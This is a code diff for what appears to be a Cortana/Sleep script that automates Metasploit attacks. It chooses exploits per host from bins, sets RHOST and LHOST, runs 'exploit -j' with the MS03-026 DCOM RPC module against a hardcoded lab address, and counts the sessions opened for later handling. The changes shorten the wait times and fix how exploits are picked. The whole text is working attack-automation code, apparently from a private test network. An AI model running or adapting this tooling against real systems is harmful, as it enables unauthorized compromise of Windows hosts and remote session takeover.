@@ -2,8 +2,8 @@ command arguments {
    local('$counter @attacks $minBin');
 
    $counter = $1;
-   #@attacks = split(';', "172.16.221.133,windows/dcerpc/ms03_026_dcom,172.16.221.1,6.0;172.16.221.132,windows/dcerpc/ms03_026_dcom,172.16.221.1,6.0;");
-   @attacks = split(';', "$2");
+   @attacks = split(';', "172.16.221.132,windows/dcerpc/ms03_026_dcom,172.16.221.1,4.0;"); #172.16.221.132,windows/dcerpc/ms03_026_dcom,172.16.221.1,6.0;");
+   #@attacks = split(';', "$2");
    $minBin = $3;
    $numExisting = $4;
 
@@ -127,9 +127,9 @@ sub determinePayload {
 
 # $1 = %h, $2 = $numBins, $3 = %num_exps, $4 = @hosts, $5 = %exploits, $6 = $numExisting
 on launch_attacks {  
-   local('$console %h $numBins %num_exps @hosts %exploits %attacks $payload $i $host $bin $count $attack %exp_run $rhost $name $lhost $os $exploit $numExisting');
+   local('$console %h $numBins %num_exps @hosts %exploits %attacks $payload $i $host $bin $count $attack %exp_run $rhost $name $lhost $os $exploit $numExisting $tempNumBins');
 
-   %h = $1;
+   %attacks = $1;
    $numBins = $2;
    %num_exps = $3;
    @hosts = $4;
@@ -138,29 +138,31 @@ on launch_attacks {
 
    $console = console();
    cmd($console, "jobs -K");
-   yield;
-   %attacks = $1;
    $payload = "";
    $count = 0;
 
    #println("numBins: " . "$numBins");
 
    for ($i = 0; $i < size(@hosts); $i++) {
+      $tempNumBins = $numBins;
       $host = @hosts[$i];
       #println("Num exploits for $host : " . %num_exps[$host]);
       while ($count < %num_exps[$host]) {
          $bin = -1;
          while ($bin < 0) {
-            $bin = getBin($numBins);
+            $bin = getBin($tempNumBins);
             if (size(%attacks[$host][$bin]) == 0) {
+               #println(%attacks[$host]);
+               (%attacks[$host])= moveBins(%attacks[$host], $bin, $tempNumBins);
+               $tempNumBins--;
+               #println(%attacks[$host]);
                $bin = -1;
-               #%attacks[$host] = moveBins(%attacks[$host], $bin, $numBins);
             }
             #println("loop bin: " . "$bin");
          }
          #println("exit bin: " . "$bin");
          #println(size(%attacks[$host][$bin]));
-         $count++
+         $count++;
          #println(%attacks[$host][$bin]);
          $attack = rand(%attacks[$host][$bin]);
          remove(%attacks[$host][$bin], $attack);
@@ -182,7 +184,7 @@ on launch_attacks {
          cmd_set($console, %(RHOST => "$rhost", LHOST => "$lhost", TARGET => "0"));
          cmd($console, "exploit -j");
       
-         sleep(15000);
+         sleep(4000);
          cmd($console, "jobs -K");
          sleep(1000);
          if (size(sessions()) > $numSessions) {
@@ -204,9 +206,20 @@ on launch_attacks {
    fire_event_local("sessionHandle", @hosts, %exploits, %exp_run);
 }
 
-$1 = %attacks[$host], $2 = $bin, $3 = $numBins
+#$1 = %attacks[$host], $2 = $bin, $3 = $numBins
 sub moveBins {
+   local('%attacks $bin, $numBins $i');
 
+   %attacks = $1;
+   $bin = $2;
+   $numBins = $3;
+
+   for ($i = $bin; $i < $numBins; $i++) {
+      %attacks[$i] = copy(%attacks[$i + 1]);
+      clear(%attacks[$i + 1]);
+   }
+
+   return %attacks;
 }
 
 #$1 = @hosts, $2 = %exploits, $3 = %exp_run
@@ -223,10 +236,7 @@ on sessionHandle {
    $console = console();
    @hosts = $1;
 
-   on("console", &this);   
-
    cmd($console, "jobs -K");
-   yield;
 
    foreach $sessionNum (@ids) {
    	%r = %out[$sessionNum];
